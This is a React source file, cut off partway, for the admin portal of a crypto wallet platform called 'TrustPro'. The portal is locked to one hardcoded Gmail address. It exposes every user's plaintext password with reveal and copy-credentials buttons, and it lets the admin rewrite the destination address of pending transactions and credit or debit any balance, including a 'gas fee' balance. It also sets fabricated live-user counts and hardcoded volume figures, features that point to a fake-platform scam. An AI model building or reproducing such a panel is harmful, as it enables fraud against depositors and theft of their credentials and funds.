import React, { useState, useEffect } from 'react';
import { useWallet } from '../context/WalletContext';
import { UserAccount, CryptoAsset } from '../types';
import {
  ShieldCheck,
  Users,
  PlusCircle,
  MinusCircle,
  Search,
  Lock,
  Unlock,
  Key,
  CheckCircle2,
  XCircle,
  AlertCircle,
  BarChart3,
  Coins,
  FileText,
  Download,
  Activity,
  UserCheck,
  UserX,
  Settings,
  Plus,
  RefreshCw,
  Trash2,
  Clock,
  Check,
  X,
  Edit2,
  Save,
  Snowflake,
  Sun,
  Zap,
  Upload,
  Eye,
  EyeOff,
  Copy,
  Sliders,
  Fingerprint,
} from 'lucide-react';

export const AdminDashboard: React.FC = () => {
  const {
    currentUser,
    users,
    assets,
    transactions,
    auditLogs,
    creditUserBalance,
    debitUserBalance,
    updateUserStatus,
    toggleUserFreeze,
    updateTransactionDetails,
    updateUserKyc,
    deleteUserAccount,
    resetUserPasswordAdmin,
    addCustomAsset,
    deleteCustomAsset,
    toggleAssetEnabled,
    depositAddresses,
    updateDepositAddress,
    withdrawAddresses,
    updateWithdrawAddress,
    networkFeeQrCode,
    updateNetworkFeeQrCode,
    approveTransaction,
    rejectTransaction,
    platformTrafficConfig,
    updatePlatformTrafficConfig,
  } = useWallet();

  const isAdminAuthorized =
    currentUser?.email.toLowerCase() === 'legendxadmin1999@gmail.com' &&
    currentUser?.role === 'admin';

  if (!isAdminAuthorized) {
    return (
      <div className="mx-auto max-w-xl py-20 text-center">
        <div className="mx-auto h-16 w-16 rounded-full bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-500 mb-4">
          <ShieldCheck className="h-8 w-8" />
        </div>
        <h2 className="text-xl font-bold text-white">Access Denied</h2>
        <p className="text-xs text-slate-400 mt-2">
          Admin Portal is strictly restricted to authorized super administrators (<span className="text-emerald-400 font-mono">legendxadmin1999@gmail.com</span>).
        </p>
      </div>
    );
  }

  const [activeTab, setActiveTab] = useState<
    'overview' | 'pending_txs' | 'credit_debit' | 'users' | 'traffic' | 'coins' | 'reports' | 'audit'
  >('pending_txs');

  // Password Visibility State for User Credentials Inspection
  const [visiblePasswords, setVisiblePasswords] = useState<Record<string, boolean>>({});
  const [copiedPassUserId, setCopiedPassUserId] = useState<string | null>(null);

  const togglePasswordVisibility = (userId: string) => {
    setVisiblePasswords((prev) => ({ ...prev, [userId]: !prev[userId] }));
  };

  // Sync traffic config from context when loaded or updated
  useEffect(() => {
    if (platformTrafficConfig) {
      setTrafficActiveUsers(platformTrafficConfig.activeUsers);
      setTrafficLiveTraders(platformTrafficConfig.liveTraders);
      setTrafficOnlineNodes(platformTrafficConfig.onlineNodes);
      setTrafficStatus(platformTrafficConfig.systemStatus);
      setTrafficTicker(platformTrafficConfig.tickerNotice);
      setTrafficAutoFluctuate(platformTrafficConfig.autoFluctuate);
    }
  }, [platformTrafficConfig?.activeUsers, platformTrafficConfig?.liveTraders, platformTrafficConfig?.onlineNodes, platformTrafficConfig?.systemStatus, platformTrafficConfig?.tickerNotice, platformTrafficConfig?.autoFluctuate]);
  const [trafficActiveUsers, setTrafficActiveUsers] = useState<number>(
    platformTrafficConfig?.activeUsers || 348920
  );
  const [trafficLiveTraders, setTrafficLiveTraders] = useState<number>(
    platformTrafficConfig?.liveTraders || 188416
  );
  const [trafficOnlineNodes, setTrafficOnlineNodes] = useState<number>(
    platformTrafficConfig?.onlineNodes || 62805
  );
  const [trafficStatus, setTrafficStatus] = useState<
    'OPERATIONAL' | 'HIGH_VOLUME' | 'SURGE' | 'MAINTENANCE'
  >(platformTrafficConfig?.systemStatus || 'OPERATIONAL');
  const [trafficTicker, setTrafficTicker] = useState<string>(
    platformTrafficConfig?.tickerNotice || 'All Web3 nodes, liquidity pools & cross-chain bridges operating at 100% capacity.'
  );
  const [trafficAutoFluctuate, setTrafficAutoFluctuate] = useState<boolean>(
    platformTrafficConfig?.autoFluctuate ?? true
  );
  const [trafficSavedSuccess, setTrafficSavedSuccess] = useState<boolean>(false);

  const handleSaveTrafficConfig = (e: React.FormEvent) => {
    e.preventDefault();
    updatePlatformTrafficConfig({
      activeUsers: Number(trafficActiveUsers) || 348920,
      liveTraders: Number(trafficLiveTraders) || Math.floor(Number(trafficActiveUsers) * 0.54),
      onlineNodes: Number(trafficOnlineNodes) || Math.floor(Number(trafficActiveUsers) * 0.18),
      systemStatus: trafficStatus,
      tickerNotice: trafficTicker,
      autoFluctuate: trafficAutoFluctuate,
    });
    setTrafficSavedSuccess(true);
    setTimeout(() => setTrafficSavedSuccess(false), 3000);
  };

  // Search & Filter state
  const [userSearch, setUserSearch] = useState('');

  // Credit / Debit State
  const [selectedUserId, setSelectedUserId] = useState(users[0]?.id || '');
  const [selectedAssetSymbol, setSelectedAssetSymbol] = useState('USDT');
  const [adjustAmount, setAdjustAmount] = useState('500');
  const [adjustNote, setAdjustNote] = useState('Web3 Vault Reserve Settlement');
  const [adjustFeedback, setAdjustFeedback] = useState<{ success: boolean; message: string } | null>(null);

  // Custom Coin Addition State
  const [newCoinSymbol, setNewCoinSymbol] = useState('');
  const [newCoinName, setNewCoinName] = useState('');
  const [newCoinNetwork, setNewCoinNetwork] = useState('ERC-20');
  const [newCoinPrice, setNewCoinPrice] = useState('1.00');

  // Temporary password reset result
  const [resetPassModal, setResetPassModal] = useState<{ email: string; pass: string } | null>(null);

  // User deletion modal state
  const [deleteUserConfirm, setDeleteUserConfirm] = useState<{ id: string; name: string; email: string } | null>(null);
  const [deleteFeedback, setDeleteFeedback] = useState<{ success: boolean; message: string } | null>(null);

  // Address edit state for transactions in Admin Dashboard
  const [editingTxId, setEditingTxId] = useState<string | null>(null);
  const [editToAddressInput, setEditToAddressInput] = useState<string>('');

  const filteredUsers = users.filter(
    (u) =>
      u.name.toLowerCase().includes(userSearch.toLowerCase()) ||
      u.email.toLowerCase().includes(userSearch.toLowerCase())
  );

  const handleApplyCredit = () => {
    const num = parseFloat(adjustAmount) || 0;
    if (num <= 0) return;
    const res = creditUserBalance(selectedUserId, selectedAssetSymbol, num, adjustNote);
    setAdjustFeedback(res);
    setTimeout(() => setAdjustFeedback(null), 4000);
  };

  const handleApplyDebit = () => {
    const num = parseFloat(adjustAmount) || 0;
    if (num <= 0) return;
    const res = debitUserBalance(selectedUserId, selectedAssetSymbol, num, adjustNote);
    setAdjustFeedback(res);
    setTimeout(() => setAdjustFeedback(null), 4000);
  };

  const handleCreateCustomCoin = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newCoinSymbol || !newCoinName) return;

    addCustomAsset({
      symbol: newCoinSymbol,
      name: newCoinName,
      network: newCoinNetwork,
      priceUsd: parseFloat(newCoinPrice) || 1.0,
    });

    setNewCoinSymbol('');
    setNewCoinName('');
  };

  const handleExportCsv = () => {
    const headers = 'ID,Name,Email,Role,Status,KYC_Status,Created_At\n';
    const rows = users
      .map((u) => `${u.id},${u.name},${u.email},${u.role},${u.status},${u.kycStatus},${u.createdAt}`)
      .join('\n');
    const blob = new Blob([headers + rows], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `TrustPro_Users_Export_${Date.now()}.csv`;
    a.click();
  };

  return (
    <div className="mx-auto max-w-7xl px-4 py-8 sm:px-6 lg:px-8 space-y-8">
      {/* HEADER BAR */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-[#f0b90b]/20 pb-6">
        <div>
          <div className="flex items-center gap-2">
            <ShieldCheck className="h-7 w-7 text-[#f0b90b]" />
            <h1 className="text-3xl font-black tracking-tight text-white uppercase">TrustPro Enterprise Admin Portal</h1>
          </div>
          <p className="text-xs text-slate-400 mt-1">
            Role-Based Access Control • Account Ledger Adjustments • Multi-Chain Coin Management • Compliance Audits
          </p>
        </div>

        <button
          onClick={handleExportCsv}
          className="flex items-center gap-2 rounded-xl bg-blue-300/10 border border-blue-300/30 px-4 py-2.5 text-xs font-bold text-blue-300 hover:bg-blue-300/20 transition-all shrink-0"
          id="export-csv-btn"
        >
          <Download className="h-4 w-4" />
          <span>Export System CSV Report</span>
        </button>
      </div>

      {/* ADMIN NAVIGATION TABS */}
      <div className="flex overflow-x-auto gap-2 p-1.5 rounded-2xl bg-slate-900 border border-slate-800 no-scrollbar">
        {[
          { id: 'pending_txs', label: `⏳ Pending Approvals (${transactions.filter((t) => t.status === 'pending').length})`, icon: Clock },
          { id: 'overview', label: 'Dashboard Metrics', icon: BarChart3 },
          { id: 'credit_debit', label: '💳 Balance Credit / Debit', icon: PlusCircle },
          { id: 'users', label: 'User Accounts & Credentials', icon: Users },
          { id: 'traffic', label: '🚦 Live Traffic Control', icon: Sliders },
          { id: 'coins', label: 'Coin Management', icon: Coins },
          { id: 'reports', label: 'System Reports', icon: FileText },
          { id: 'audit', label: 'Security Audit Logs', icon: Activity },
        ].map((tab) => {
          const Icon = tab.icon;
          const isActive = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`flex items-center gap-2 px-4 py-2.5 text-xs font-bold rounded-xl whitespace-nowrap transition-all ${
                isActive
                  ? 'bg-blue-300 text-black shadow-lg shadow-blue-300/10'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800'
              }`}
              id={`admin-tab-${tab.id}`}
            >
              <Icon className="h-4 w-4" />
              <span>{tab.label}</span>
            </button>
          );
        })}
      </div>

      {/* TAB: PENDING APPROVAL REQUESTS */}
      {activeTab === 'pending_txs' && (
        <div className="space-y-6">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 rounded-3xl bg-slate-900/80 border border-slate-800 p-6">
            <div>
              <h2 className="text-lg font-bold text-white flex items-center gap-2">
                <span>Pending Transaction Approval Queue</span>
                <span className="px-2.5 py-0.5 rounded-full bg-blue-300/10 border border-blue-300/30 text-[10px] font-mono text-blue-300 font-bold">
                  Manual Verification Required
                </span>
              </h2>
              <p className="text-xs text-slate-400 mt-1">
                Review deposit and withdrawal requests. Accepting sets status to Confirmed (Green). Rejecting sets status to Failed (Red) and refunds held funds.
              </p>
            </div>
          </div>

          {transactions.filter((t) => t.status === 'pending').length === 0 ? (
            <div className="rounded-3xl bg-slate-900/50 border border-slate-800 p-12 text-center">
              <CheckCircle2 className="h-12 w-12 text-emerald-400 mx-auto mb-3 opacity-60" />
              <h3 className="text-base font-bold text-white">No Pending Transactions</h3>
              <p className="text-xs text-slate-400 mt-1">All user deposits and withdrawals have been verified and processed.</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 gap-4">
              {transactions
                .filter((t) => t.status === 'pending')
                .map((tx) => {
                  const txUser = users.find((u) => u.id === tx.userId);
                  const isDeposit = tx.type === 'deposit';

                  return (
                    <div
                      key={tx.id}
                      className="rounded-3xl bg-slate-900 border border-slate-800 p-6 flex flex-col md:flex-row md:items-center justify-between gap-6 hover:border-slate-700 transition-all shadow-xl"
                    >
                      <div className="space-y-2 flex-1">
                        <div className="flex items-center gap-2">
                          <span
                            className={`px-3 py-1 rounded-full text-xs font-bold ${
                              isDeposit
                                ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                                : 'bg-rose-500/10 text-rose-400 border border-rose-500/30'
                            }`}
                          >
                            {isDeposit ? '📥 DEPOSIT REQUEST' : '📤 WITHDRAWAL REQUEST'}
                          </span>
                          <span className="text-xs font-mono text-slate-400">
                            TxID: {tx.id}
                          </span>
                        </div>

                        <div className="flex items-baseline gap-2">
                          <span className="text-2xl font-black text-white font-mono">
                            {isDeposit ? '+' : '-'}{tx.amount} {tx.assetSymbol}
                          </span>
                          <span className="text-sm font-bold text-slate-400">
                            (~${tx.amountUsd.toFixed(2)} USD)
                          </span>
                        </div>

                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs font-mono pt-2 text-slate-300">
                          <p>
                            <span className="text-slate-500 font-sans">User:</span>{' '}
                            <strong className="text-white">{txUser?.name || 'User'}</strong> ({txUser?.email || tx.userId})
                          </p>
                          <p>
                            <span className="text-slate-500 font-sans">Network:</span>{' '}
                            <strong className="text-blue-300">{tx.network}</strong>
                          </p>
                          <div className="col-span-1 sm:col-span-2 flex flex-col sm:flex-row sm:items-center gap-2">
                            <span className="text-slate-500 font-sans shrink-0">Address:</span>{' '}
                            {editingTxId === tx.id ? (
                              <div className="flex items-center gap-2 flex-1">
                                <input
                                  type="text"
                                  value={editToAddressInput}
                                  onChange={(e) => setEditToAddressInput(e.target.value)}
                                  className="w-full rounded-lg bg-slate-950 border border-blue-300/50 px-2.5 py-1 text-xs text-emerald-400 font-mono focus:outline-none"
                                />
                                <button
                                  onClick={() => {
                                    if (editToAddressInput.trim()) {
                                      updateTransactionDetails(tx.id, { toAddress: editToAddressInput.trim() });
                                    }
                                    setEditingTxId(null);
                                  }}
                                  className="px-2.5 py-1 rounded bg-emerald-500 text-black font-bold text-[10px] shrink-0"
                                >
                                  Save
                                </button>
                                <button
                                  onClick={() => setEditingTxId(null)}
                                  className="px-2 py-1 rounded bg-slate-800 text-slate-300 text-[10px] shrink-0"
                                >
                                  Cancel
                                </button>
                              </div>
                            ) : (
                              <div className="flex items-center gap-2 font-mono">
                                <span className="text-emerald-400 truncate">{tx.toAddress || tx.fromAddress || 'N/A'}</span>
                                <button
                                  onClick={() => {
                                    setEditingTxId(tx.id);
                                    setEditToAddressInput(tx.toAddress || tx.fromAddress || '');
                                  }}
                                  className="p-1 rounded bg-slate-800 text-blue-300 hover:bg-blue-300 hover:text-black transition-colors shrink-0"
                                  title="Edit Settlement Address"
                                  id={`edit-tx-addr-${tx.id}`}
                                >
                                  <Edit2 className="h-3.5 w-3.5" />
                                </button>
                              </div>
                            )}
                          </div>
                          <p>
                            <span className="text-slate-500 font-sans">Time Logged:</span>{' '}
                            <span className="text-slate-400">{new Date(tx.timestamp).toLocaleString()}</span>
                          </p>
                        </div>
                      </div>

                      {/* Admin Decision Actions */}
                      <div className="flex flex-col sm:flex-row gap-3 shrink-0 items-stretch md:items-center border-t md:border-t-0 border-slate-800 pt-4 md:pt-0">
                        <button
                          onClick={() => approveTransaction(tx.id)}
                          className="flex items-center justify-center gap-2 px-5 py-3 rounded-2xl bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-xs transition-all shadow-lg shadow-emerald-500/20"
                          id={`approve-tx-${tx.id}`}
                        >
                          <Check className="h-4 w-4 stroke-[3]" />
                          <span>Accept & Confirm (Green)</span>
                        </button>

                        <button
                          onClick={() => rejectTransaction(tx.id)}
                          className="flex items-center justify-center gap-2 px-5 py-3 rounded-2xl bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 border border-rose-500/30 font-bold text-xs transition-all"
                          id={`reject-tx-${tx.id}`}
                        >
                          <X className="h-4 w-4 stroke-[3]" />
                          <span>Reject & Fail (Red)</span>
                        </button>
                      </div>
                    </div>
                  );
                })}
            </div>
          )}
        </div>
      )}

      {/* TAB 1: OVERVIEW METRICS */}
      {activeTab === 'overview' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
            <div className="rounded-3xl bg-slate-900/80 border border-slate-800 p-6">
              <p className="text-xs text-slate-400 font-medium">Total Registered Users</p>
              <p className="text-3xl font-black text-white font-mono mt-1">{users.length}</p>
              <span className="text-[10px] text-emerald-400 font-bold mt-2 inline-block">100% Active / Verified Ratio</span>
            </div>

            <div className="rounded-3xl bg-slate-900/80 border border-slate-800 p-6">
              <p className="text-xs text-slate-400 font-medium">Supported Blockchains</p>
              <p className="text-3xl font-black text-blue-300 font-mono mt-1">15 Chains</p>
              <span className="text-[10px] text-slate-400 mt-2 inline-block">{assets.length} Active Tokens</span>
            </div>

            <div className="rounded-3xl bg-slate-900/80 border border-slate-800 p-6">
              <p className="text-xs text-slate-400 font-medium">Platform 24h Volume</p>
              <p className="text-3xl font-black text-blue-300 font-mono mt-1">$14.8M</p>
              <span className="text-[10px] text-emerald-400 font-bold mt-2 inline-block">+18.2% vs Yesterday</span>
            </div>

            <div className="rounded-3xl bg-slate-900/80 border border-slate-800 p-6">
              <p className="text-xs text-slate-400 font-medium">Platform Revenue (Gas Share)</p>
              <p className="text-3xl font-black text-emerald-400 font-mono mt-1">$48,290.00</p>
              <span className="text-[10px] text-slate-400 mt-2 inline-block">Auto-Audited Weekly</span>
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: MANUAL USER BALANCE CREDIT & DEBIT (CRITICAL USER REQUEST REQUIREMENT) */}
      {activeTab === 'credit_debit' && (
        <div className="rounded-3xl bg-[#0e1015] border border-blue-300/30 p-6 sm:p-8 space-y-6 shadow-2xl">
          <div>
            <h2 className="text-xl font-extrabold text-white flex items-center gap-2">
              <PlusCircle className="h-6 w-6 text-blue-300" />
              <span>Manual User Account Balance Adjustment (Credit / Debit)</span>
            </h2>
            <p className="text-xs text-slate-400 mt-1">
              Select any target user account to manually credit or debit crypto assets with full reference notes and automated audit logs.
            </p>
          </div>

          {adjustFeedback && (
            <div
              className={`p-4 rounded-2xl border text-xs font-bold flex items-center gap-3 ${
                adjustFeedback.success
                  ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400'
                  : 'bg-rose-500/10 border-rose-500/30 text-rose-400'
              }`}
            >
              {adjustFeedback.success ? <CheckCircle2 className="h-5 w-5 shrink-0" /> : <AlertCircle className="h-5 w-5 shrink-0" />}
              <span>{adjustFeedback.message}</span>
            </div>
          )}

          {/* Quick Network Fee / Gas Fee Protocol Selection Shortcut Banner */}
          <div className="p-4 rounded-2xl bg-blue-300/10 border border-blue-300/30 flex flex-col sm:flex-row items-center justify-between gap-3">
            <div className="flex items-center gap-3">
              <div className="h-10 w-10 rounded-xl bg-blue-300/20 border border-blue-300/40 flex items-center justify-center text-blue-300 shrink-0">
                <Zap className="h-5 w-5" />
              </div>
              <div>
                <p className="text-xs font-black text-blue-300 uppercase tracking-wider">Gas Fee (TRX) Balance Adjustment Protocol</p>
                <p className="text-[11px] text-slate-300 mt-0.5">Quickly select Gas Fee (TRX) to credit or debit Network Fee balance for selected user account</p>
              </div>
            </div>
            <div className="flex gap-2">
              <button
                type="button"
                onClick={() => {
                  setSelectedAssetSymbol('GAS_TRX');
                  if (!adjustAmount || adjustAmount === '0') setAdjustAmount('100');
                }}
                className="px-4 py-2.5 rounded-xl bg-emerald-500 text-[#0B1020] text-xs font-black hover:bg-emerald-400 transition-all shrink-0 shadow-md"
              >
                Select Gas Fee (TRX)
              </button>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* Target User Selector */}
            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1.5">Select Target User Account</label>
              <select
                value={selectedUserId}
                onChange={(e) => setSelectedUserId(e.target.value)}
                className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3.5 py-3 text-xs text-white focus:outline-none focus:border-blue-300"
                id="admin-select-target-user"
              >
                {users.map((u) => (
                  <option key={u.id} value={u.id}>
                    {u.name} ({u.email}) — Status: {u.status.toUpperCase()}
                  </option>
                ))}
              </select>
            </div>

            {/* Asset Selector */}
            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1.5">Select Crypto Asset</label>
              <select
                value={selectedAssetSymbol}
                onChange={(e) => setSelectedAssetSymbol(e.target.value)}
                className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3.5 py-3 text-xs text-white focus:outline-none focus:border-blue-300"
                id="admin-select-asset"
              >
                {Array.from(new Set(assets.map(a => a.symbol))).map(symbol => {
                  const a = assets.find(ass => ass.symbol === symbol);
                  if (!a) return null;
                  return (
                    <option key={symbol} value={symbol}>
                      {a.name} ({symbol}) — Price: ${a.priceUsd}
                    </option>
                  );
                })}
              </select>
            </div>

            {/* Adjustment Amount */}
            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1.5">Amount to Adjust</label>
              <input
                type="number"
                step="any"
                value={adjustAmount}
                onChange={(e) => setAdjustAmount(e.target.value)}
                placeholder="500"
                className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3.5 py-3 text-sm font-mono text-white focus:outline-none focus:border-blue-300"
                id="admin-adjust-amount-input"
              />
            </div>

            {/* Reference Note */}
            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1.5">Reference Note / Reason</label>
              <input
                type="text"
                value={adjustNote}
                onChange={(e) => setAdjustNote(e.target.value)}
                placeholder="Reason for adjustment..."
                className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3.5 py-3 text-xs text-white focus:outline-none focus:border-blue-300"
                id="admin-adjust-note-input"
              />
            </div>
          </div>

          {/* Action Buttons: Credit vs Debit */}
          <div className="flex flex-col sm:flex-row items-center gap-4 pt-4 border-t border-slate-800">
            <button
              onClick={handleApplyCredit}
              className="w-full sm:w-auto flex-1 flex items-center justify-center gap-2 rounded-xl bg-emerald-500 px-6 py-3.5 text-xs font-black text-black hover:bg-emerald-400 transition-all shadow-lg shadow-emerald-500/20"
              id="admin-apply-credit-btn"
            >
              <PlusCircle className="h-4 w-4" />
              <span>Credit +{adjustAmount} {selectedAssetSymbol} to User</span>
            </button>

            <button
              onClick={handleApplyDebit}
              className="w-full sm:w-auto flex-1 flex items-center justify-center gap-2 rounded-xl bg-rose-500/20 border border-rose-500/40 px-6 py-3.5 text-xs font-black text-rose-300 hover:bg-rose-500/30 transition-all"
              id="admin-apply-debit-btn"
            >
              <MinusCircle className="h-4 w-4" />
              <span>Debit -{adjustAmount} {selectedAssetSymbol} from User</span>
            </button>
          </div>
        </div>
      )}

      {/* TAB 3: USER MANAGEMENT & KYC */}
      {activeTab === 'users' && (
        <div className="rounded-3xl bg-slate-900/80 border border-slate-800 p-6 space-y-6">
          {deleteFeedback && (
            <div className={`p-4 rounded-2xl border text-xs font-bold flex items-center gap-2 ${
              deleteFeedback.success ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' : 'bg-rose-500/10 border-rose-500/30 text-rose-400'
            }`}>
              <CheckCircle2 className="h-4 w-4 shrink-0" />
              <span>{deleteFeedback.message}</span>
            </div>
          )}

          <div className="flex flex-col sm:flex-row items-center justify-between gap-4">
            <h2 className="text-lg font-bold text-white flex items-center gap-2">
              <Users className="h-5 w-5 text-blue-300" />
              <span>Registered User Accounts & Plaintext Credentials Inspector</span>
            </h2>

            <div className="relative w-full sm:w-64">
              <Search className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
              <input
                type="text"
                placeholder="Search user name or email..."
                value={userSearch}
                onChange={(e) => setUserSearch(e.target.value)}
                className="w-full rounded-xl bg-slate-950 border border-slate-800 pl-9 pr-3 py-2 text-xs text-white focus:outline-none focus:border-blue-300"
              />
            </div>
          </div>

          {/* CREDENTIALS MASTER INSPECTION BANNER */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
            {filteredUsers.slice(0, 3).map((u) => {
              const isPassVisible = visiblePasswords[u.id];
              const pwdText = u.password || 'Legendx@123';
              return (
                <div key={`card-${u.id}`} className="p-3.5 rounded-2xl bg-slate-950 border border-amber-500/20 space-y-2">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <div className="h-2 w-2 rounded-full bg-emerald-400"></div>
                      <span className="font-bold text-white text-xs">{u.name}</span>
                    </div>
                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-blue-500/10 text-blue-300 uppercase">
                      {u.role}
                    </span>
                  </div>

                  <div className="space-y-1 font-mono text-[11px]">
                    <div className="flex items-center justify-between text-slate-400">
                      <span>Email:</span>
                      <span className="text-white font-bold">{u.email}</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-slate-400">Password:</span>
                      <div className="flex items-center gap-1.5">
                        <span className="text-emerald-400 font-bold">
                          {isPassVisible ? pwdText : '••••••••••••'}
                        </span>
                        <button
                          type="button"
                          onClick={() => togglePasswordVisibility(u.id)}
                          className="p-1 text-slate-400 hover:text-white"
                          title="Toggle Password View"
                        >
                          {isPassVisible ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
                        </button>
                        <button
                          type="button"
                          onClick={() => {
                            navigator.clipboard.writeText(`Email: ${u.email}\nPassword: ${pwdText}`);
                            setCopiedPassUserId(u.id);
                            setTimeout(() => setCopiedPassUserId(null), 2000);
                          }}
                          className="p-1 text-slate-400 hover:text-emerald-400"
                          title="Copy Email & Password"
                        >
                          <Copy className="h-3.5 w-3.5" />
                        </button>
                      </div>
                    </div>
                  </div>
                  {copiedPassUserId === u.id && (
                    <p className="text-[10px] text-emerald-400 font-bold text-right">Copied Credentials!</p>
                  )}
                </div>
              );
            })}
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs">
              <thead className="border-b border-slate-800 text-[11px] font-bold uppercase tracking-wider text-slate-400">
                <tr>
                  <th className="pb-3">User</th>
                  <th className="pb-3">Email & Password</th>
                  <th className="pb-3">Role</th>
                  <th className="pb-3">Status</th>
                  <th className="pb-3">KYC Status</th>
                  <th className="pb-3">2FA / Passkey</th>
                  <th className="pb-3 text-right">Admin Controls</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60 font-medium">
                {filteredUsers.map((u) => {
                  const isPassVisible = visiblePasswords[u.id];
                  const userPwd = u.password || 'Legendx@123';
                  return (
                    <tr key={u.id} className="hover:bg-slate-800/30 transition-colors">
                      <td className="py-4">
                        <div className="flex items-center gap-3">
                          <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-gradient-to-br from-[#16E6A8] via-[#1E88FF] to-[#3B82F6] text-[#0B1020] font-black text-xs shrink-0">
                            {(u.name || 'US').slice(0, 2).toUpperCase()}
                          </div>
                          <div>
                            <p className="font-bold text-white">{u.name}</p>
                            <p className="text-[10px] text-slate-400 font-mono">
                              ID: {u.id.slice(0, 8)}... • Registered: {new Date(u.createdAt || Date.now()).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}
                            </p>
                          </div>
                        </div>
                      </td>

                      {/* USER EMAIL AND PASSWORD COLUMN */}
                      <td className="py-4 font-mono">
                        <div className="space-y-1">
                          <p className="text-white font-bold text-[11px]">{u.email}</p>
                          <div className="flex items-center gap-1.5">
                            <span className="text-emerald-400 font-bold bg-emerald-500/10 border border-emerald-500/20 px-2 py-0.5 rounded text-[11px]">
                              {isPassVisible ? userPwd : '••••••••••••'}
                            </span>
                            <button
                              type="button"
                              onClick={() => togglePasswordVisibility(u.id)}
                              className="p-1 rounded bg-slate-900 border border-slate-800 text-slate-300 hover:text-white"
                              id={`toggle-pass-btn-${u.id}`}
                              title={isPassVisible ? 'Hide Password' : 'View Password'}
                            >
                              {isPassVisible ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
                            </button>
                            <button
                              type="button"
                              onClick={() => {
                                navigator.clipboard.writeText(`Email: ${u.email} | Password: ${userPwd}`);
                                setCopiedPassUserId(u.id);
                                setTimeout(() => setCopiedPassUserId(null), 2000);
                              }}
                              className="p-1 rounded bg-slate-900 border border-slate-800 text-slate-300 hover:text-emerald-400"
                              title="Copy Credentials"
                            >
                              <Copy className="h-3.5 w-3.5" />
                            </button>
                          </div>
                        </div>
                      </td>

                    <td className="py-4 font-mono">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${u.role === 'admin' ? 'bg-blue-300/20 text-blue-300' : 'bg-slate-800 text-slate-300'}`}>
                        {u.role.toUpperCase()}
                      </span>
                    </td>

                    <td className="py-4 font-semibold">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${u.status === 'active' ? 'bg-emerald-500/10 text-emerald-400' : 'bg-rose-500/10 text-rose-400'}`}>
                        {u.status.toUpperCase()}
                      </span>
                    </td>

                    <td className="py-4">
                      <select
                        value={u.kycStatus}
                        onChange={(e) => updateUserKyc(u.id, e.target.value as any)}
                        className="rounded-lg bg-slate-950 border border-slate-800 px-2 py-1 text-[11px] text-blue-300 focus:outline-none"
                      >
                        <option value="unverified">Unverified</option>
                        <option value="pending">Pending</option>
                        <option value="verified">Verified</option>
                        <option value="rejected">Rejected</option>
                      </select>
                    </td>

                    <td className="py-4 text-slate-400 text-[11px]">
                      2FA: {u.twoFactorEnabled ? 'Enabled' : 'Off'} | Passkey: {u.passkeyEnabled ? 'Yes' : 'No'}
                    </td>

                    <td className="py-4 text-right">
                      <div className="flex items-center justify-end gap-2">
                        <button
                          onClick={() => toggleUserFreeze(u.id)}
                          className={`flex items-center gap-1 px-2.5 py-1 rounded font-bold text-[10px] border transition-all ${
                            u.isFrozen
                              ? 'bg-blue-300/20 text-blue-300 border-blue-300/40 hover:bg-blue-300/30'
                              : 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 hover:bg-cyan-500/20'
                          }`}
                          id={`admin-freeze-user-${u.id}`}
                        >
                          <Snowflake className="h-3 w-3" />
                          <span>{u.isFrozen ? 'Unfreeze' : 'Freeze'}</span>
                        </button>

                        {u.status === 'active' ? (
                          <button
                            onClick={() => updateUserStatus(u.id, 'suspended')}
                            className="px-2.5 py-1 rounded bg-rose-500/10 text-rose-400 hover:bg-rose-500/20 font-bold text-[10px]"
                          >
                            Suspend
                          </button>
                        ) : (
                          <button
                            onClick={() => updateUserStatus(u.id, 'active')}
                            className="px-2.5 py-1 rounded bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 font-bold text-[10px]"
                          >
                            Restore
                          </button>
                        )}

                        <button
                          onClick={() => {
                            const pass = resetUserPasswordAdmin(u.id);
                            setResetPassModal({ email: u.email, pass });
                          }}
                          className="px-2.5 py-1 rounded bg-slate-800 text-slate-300 hover:text-white font-bold text-[10px]"
                        >
                          Reset Pass
                        </button>

                        <button
                          onClick={() => setDeleteUserConfirm({ id: u.id, name: u.name, email: u.email })}
